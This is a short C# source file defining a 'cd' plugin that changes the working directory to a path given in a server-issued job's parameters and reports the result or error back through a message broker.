using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "cd";
        private IDataBroker messageManager { get; set; }
        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
        }

        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            try
            {
                if (args.ContainsKey("path") && !string.IsNullOrEmpty(args["path"]))
                {
                    string path = (args["path"]).Replace("\"", "");

                    DebugLog.Log($"{Name} changing to: {path} [{job.task.id}]");
                    Directory.SetCurrentDirectory(path);

                    messageManager.Write($"Changed directory to {Directory.GetCurrentDirectory()}", job.task.id, true);
                    DebugLog.Log($"{Name} completed [{job.task.id}]");
                }
                else
                {
                    DebugLog.Log($"{Name} missing path parameter [{job.task.id}]");
                    messageManager.Write("Missing path parameter", job.task.id, true, "error");
                }
            }
            catch (Exception e)
            {
                DebugLog.Log($"{Name} error [{job.task.id}]: {e.Message}");
                messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
        }
    }
}
